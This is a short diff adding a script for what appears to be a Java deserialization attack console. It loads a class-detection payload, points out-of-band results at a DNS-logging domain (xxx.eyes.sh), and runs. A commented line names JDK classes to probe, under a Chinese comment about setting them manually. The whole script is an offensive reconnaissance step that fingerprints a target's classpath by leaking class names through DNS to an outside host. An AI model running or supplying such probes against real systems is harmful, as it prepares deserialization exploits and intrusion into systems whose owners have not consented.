@@ -1,0 +1,6 @@
+use payload DetectClass
+use bullet DetectClassBullet
+set domain xxx.eyes.sh
+# 手动设置探测的类
+# set param linux:com.sun.security.auth.module.UnixSystem;becl:com.sun.org.apache.bcel.internal.util.ClassLoader
+run
